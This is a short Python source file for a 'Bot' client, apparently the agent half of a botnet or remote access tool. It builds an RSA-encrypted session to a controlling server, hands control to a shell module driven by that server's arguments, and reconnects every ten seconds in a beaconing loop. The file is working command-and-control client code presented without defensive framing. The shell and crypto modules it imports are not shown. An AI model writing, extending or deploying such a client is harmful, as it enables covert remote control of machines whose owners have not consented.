# Date: 06/04/2018
# Author: Pure-L0G1C
# Description: Bot 

import socket
from os import getcwd
from time import sleep 
from lib import shell, crypto, session

class Bot(object):
 
 def __init__(self, home):
  self.is_active = False 
  self.is_alive = True
  self.home = home
  self.conn = None 
  self.port = None 
  self.ip = None

 def shutdown(self):
  try:
   self.conn.shutdown(socket.SHUT_RDWR)
   self.conn.close()
  except:pass

 def connect(self):
  publ_key, priv_key = crypto.CryptoRSA.generate_keys()
  self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s = session.Session(self.conn, priv_key, publ_key)
  services = s.connect(self.ip, self.port)

  if not services:
   self.ip, self.port, self.is_active = None, None, False
   self.display_text('Error: Server is unavailable, trying again in a bit')
  else:
   _shell = shell.Shell(s, services['args'], self.home)
   self.is_active = True
   _shell.shell()

 # -------- UI -------- #

 def display_text(self, text):
  print('{0}{1}{0}'.format('\n\n\t', text))

 def contact_server(self, ip, port):
  self.ip, self.port = ip, int(port)
  self.connect()

if  __name__ == '__main__':
 home = getcwd()
 while True:
  bot = Bot(home)
  bot.contact_server('127.0.0.1', 8080)
  bot.shutdown()
  try:sleep(10)
  except:break
  del bot 